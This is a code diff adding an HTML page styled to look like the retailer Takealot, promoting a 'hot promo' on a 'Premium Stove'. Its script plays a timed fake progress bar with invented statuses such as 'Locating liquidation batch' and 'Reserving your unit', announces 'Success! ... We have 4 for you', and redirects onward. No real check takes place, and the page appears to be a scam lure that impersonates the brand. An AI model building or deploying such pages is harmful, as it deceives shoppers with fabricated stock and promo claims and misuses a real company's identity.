@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Takealot | Processing Hot Promo...</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --tk-blue: #0B79BF;
+            --tk-dark: #121212;
+            --tk-grey: #4C4C4E;
+            --glass: rgba(0, 0, 0, 0.03);
+            --premium-gradient: linear-gradient(135deg, #0b79bf 0%, #064d7a 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: var(--tk-dark);
+            position: relative;
+        }
+
+        /* Animated Background */
+        .bg-glow {
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle at 50% 50%, rgba(11, 121, 191, 0.05) 0%, transparent 50%);
+            animation: pulseBg 8s infinite alternate ease-in-out;
+            z-index: 0;
+        }
+
+        @keyframes pulseBg {
+            0% {
+                transform: scale(1) translate(-10%, -10%);
+                opacity: 0.3;
+            }
+
+            100% {
+                transform: scale(1.2) translate(5%, 5%);
+                opacity: 0.6;
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 2.5rem 2rem;
+            max-width: 420px;
+            width: 90%;
+            backdrop-filter: blur(10px);
+            background: #ffffff;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            border-radius: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+        }
+
+        .logo-wrapper {
+            margin-bottom: 2rem;
+            position: relative;
+        }
+
+        .logo-container {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 24px;
+            display: inline-block;
+            box-shadow: 0 10px 40px rgba(11, 121, 191, 0.15);
+            animation: logoFloat 3s infinite ease-in-out;
+            border: 1px solid rgba(0, 0, 0, 0.03);
+        }
+
+        .logo-container img {
+            width: 160px;
+            display: block;
+        }
+
+        @keyframes logoFloat {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+            }
+
+            50% {
+                transform: translateY(-8px) scale(1.01);
+            }
+        }
+
+        .promo-badge {
+            display: inline-block;
+            background: #ff3b30;
+            color: white;
+            font-size: 0.75rem;
+            font-weight: 800;
+            padding: 5px 14px;
+            border-radius: 100px;
+            margin-bottom: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            animation: bounceIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 4px 12px rgba(255, 59, 48, 0.3);
+        }
+
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+
+            80% {
+                transform: scale(1.1);
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        h1 {
+            font-weight: 800;
+            font-size: 1.6rem;
+            margin-bottom: 0.6rem;
+            color: var(--tk-dark);
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 2.5rem;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+
+        /* Loading Bar */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--tk-blue);
+            box-shadow: 0 0 15px rgba(11, 121, 191, 0.3);
+            border-radius: 10px;
+            transition: width 0.1s linear;
+        }
+
+        .status-text {
+            font-size: 0.75rem;
+            color: var(--tk-blue);
+            text-transform: uppercase;
+            font-weight: 700;
+            letter-spacing: 2px;
+            height: 20px;
+        }
+
+        /* Micro-animations */
+        .dots {
+            display: inline-block;
+            width: 15px;
+            text-align: left;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="bg-glow"></div>
+
+    <div class="container">
+        <div class="logo-wrapper">
+            <div class="logo-container">
+                <img src="logo-takealot.svg" alt="Takealot">
+            </div>
+        </div>
+
+        <div class="promo-badge">HOT PROMO</div>
+
+        <h1>Processing Offer</h1>
+        <p>Verifying exclusive Premium Stove stock in Takealot warehouses...</p>
+
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+
+        <div class="status-text" id="status">STARTING...</div>
+    </div>
+
+    <script>
+        const statusEl = document.getElementById('status');
+        const progressEl = document.getElementById('progress');
+
+        const statuses = [
+            "Connecting to server...",
+            "Locating liquidation batch...",
+            "Validating promo code...",
+            "Reserving your unit...",
+            "Redirecting..."
+        ];
+
+        let currentStatus = 0;
+        let progress = 0;
+        const duration = 3000; // Updated to 3 seconds
+        const startTime = Date.now();
+
+        function update() {
+            const elapsed = Date.now() - startTime;
+            progress = Math.min((elapsed / duration) * 100, 100);
+            progressEl.style.width = progress + '%';
+
+            // Change status text based on progress
+            const statusIndex = Math.min(
+                Math.floor((progress / 100) * statuses.length),
+                statuses.length - 1
+            );
+
+            if (statusIndex !== currentStatus) {
+                currentStatus = statusIndex;
+                statusEl.innerText = statuses[currentStatus].toUpperCase();
+            }
+
+            if (progress < 100) {
+                requestAnimationFrame(update);
+            } else {
+                // Show final result message before redirecting
+                setTimeout(() => {
+                    document.querySelector('h1').innerText = "Success!";
+                    document.querySelector('p').innerText = "Results found. We have 4 for you.";
+                    statusEl.innerText = "FINALIZING...";
+
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 2000);
+                }, 500);
+            }
+        }
+
+        // Wait slightly before starting
+        setTimeout(() => {
+            update();
+        }, 500);
+    </script>
+</body>
+
+</html>
